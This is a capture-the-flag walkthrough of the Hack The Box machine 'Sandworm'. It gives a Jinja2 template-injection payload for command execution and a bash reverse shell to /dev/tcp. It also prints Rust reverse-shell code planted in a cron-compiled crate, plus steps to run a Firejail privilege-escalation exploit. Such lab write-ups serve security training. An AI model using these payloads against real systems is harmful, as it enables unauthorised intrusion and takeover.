# Sandworm

- **Platform:** Hack The Box
- **URL:** https://app.hackthebox.com/machines/Sandworm
- **Difficulty:** Medium
- **OS:** Linux

## Enumeration

### Port & Service Enumeration


<details>
<summary>masscan</summary>

```
sudo masscan -p1-65535,U:1-65535 --rate=1000 -e tun0 10.10.11.218

Discovered open port 443/tcp on 10.10.11.218
Discovered open port 22/tcp on 10.10.11.218
Discovered open port 80/tcp on 10.10.11.218
```
</details>

<details>
<summary>nmap</summary>

```
nmap -sC -sV 10.10.11.218

22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

### Web Enumeration

<details>
<summary>gobuster dir</summary>

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'https://ssa.htb/' --no-tls-validation

/contact              (Status: 200) [Size: 3543]
/about                (Status: 200) [Size: 5584]
/login                (Status: 200) [Size: 4392]
/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
/guide                (Status: 200) [Size: 9043]
/pgp                  (Status: 200) [Size: 3187]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/process              (Status: 405) [Size: 153]
```
</details>

## Foothold

### Web → `atlas` *(Firejail)*

#### Searching for Vulnerabilities

- the footer of the page says "Powered by Flask"
- the `/guide`-page has a section to verify signed PGP-messages
- when generating a new PGP keypair using `gpg --full-generate-key`, we can enter a name, an email-address and a comment; this information is displayed in a pop-up after successful verification by the site
- the output is not escaped, therefore a **Jinja2 template injection** is possible
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#rce-escaping

#### Exploitation

1. Generate a GPG keypair using `gpg --full-generate-key`, set the name to the following value:
    ```
    {{''.__class__.mro()[-1].__subclasses__()[439](request.form.input,shell=True,stdout=-1).communicate()[0].strip()}}
    ```
    - `‘'.__class__.mro()[-1]` gives access to `<class 'object'>`, 
    - subclass 439 is `<class 'subprocess.Popen'>`, which allows us to do a RCE
    - `request.form.input` gives us access to the POST parameter `input` of the request
    - → the value of the POST parameter will be executed

2. Export the public key and enter it on the `/guide`-page in the verification form:
    ```bash
    gpg --armor --export <email> > mykey.gpg
    ```
    - `<email>` is the email that was specified during key generation

3. Sign any message using the generated keypair and enter it on the website:
    ```
    gpg --armor --clear-sign -u <email> -o <output file> <message>
    ```

4. start a reverse shell listener using netcat:
    ```
    nc -lvnp 9002
    ```

5. Verify the signed message using the form, but intercept the request using burpsuite. Add the POST parameter `input` with the url-encoded payload for a reverse shell:
    ```bash
    bash -c '/bin/sh -i >& /dev/tcp/<your ip>/9002 0>&1'
    # url-encoded as a POST paramter:
    &input=%62%61%73%68%20%2d%63%20%27...
    ```

6. You should now have reverse shell access for the user `atlas`.
    - available commands very limited, hardly any write permissions
    - `cat /proc/1/cgroup` shows that we are in a [Firejail](https://github.com/netblue30/firejail) environment


## Lateral Movement

### `atlas` → `silentobserver` 🚩

#### Searching for Vulnerabilities

- `/etc/passwd` shows, that there is another user `silentobserver` with a home directory

#### Exploitation

1. `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json` contains credentials for user `silentobserver`:
    ```
    "auth": {
            "password": "quietLiketheWind22",
            "type": null,
            "username": "silentobserver"
        },
    ```

2. With these credentials, an SSH connection is possible for the user `silentobserver`, who has the user flag in his home directory 🚩
    - user is still in `jailer` group


### `silentobserver` → `atlas` *(unrestricted)*

#### Searching for Vulnerabilities

- the `/opt/tipnet/target/debug/tipnet` binary has the SUID bit set for user `atlas`
- the source code for `tipnet` can be found at `/opt/tipnet/src/main.rs`
- `main.rs` shows, that crate `/opt/crates/logger/src/logger.rs` gets imported
- `silentobserver` has write access to `logger.rs`
- there is a cron job running, which periodically compiles and runs `tipnet`
 
#### Exploitation

1. Edit `/opt/crates/logger/src/logger.rs` and insert the code for a reverse shell
    - https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python
    - <details>
        <summary>modified logger.rs</summary>
        
        ```rust
        extern crate chrono;

        use std::fs::OpenOptions;
        use std::io::Write;
        use chrono::prelude::*;
        use std::net::TcpStream;
        use std::os::unix::io::{AsRawFd, FromRawFd};
        use std::process::{Command, Stdio};

        pub fn log(user: &str, query: &str, justification: &str) {
                let s = TcpStream::connect("<your ip>:9002").unwrap();
            let fd = s.as_raw_fd();
            Command::new("/bin/sh")
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()
                .unwrap()
                .wait()
                .unwrap();

            let now = Local::now();
            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
            let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

            let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
                Ok(file) => file,
                Err(e) => {
                    println!("Error opening log file: {}", e);
                    return;
                }
            };

            if let Err(e) = file.write_all(log_message.as_bytes()) {
                println!("Error writing to log file: {}", e);
            }
        }
        ```
        
        </details>


2. Start a reverse shell listener using netcat:
    ```
    nc -lvnp 9002
    ```

3. After a while, we get reverse shell access for `atlas` in an unrestricted environment.

## Privilege Escalation

### `atlas` → `root` 🏁

#### Searching for Vulnerabilities

- An [exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25) exists for    Firejail 0.9.68, which can be used for privilege escalation

#### Exploitation

1. Open a second reverse shell for `atlas` like explained above.
2. Download the [exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25) on the target machine, e.g. using an python http server and wget.
3. Run the exploit using `chmod +x exploit.py && python3 exploit.py`.
4. In the second reverse shell, first run `firejail --join=<id>` *(the exploit will tell you the exact command)*, then `su -`.
5. We now have shell access for `root` and can claim the root flag! 🏁

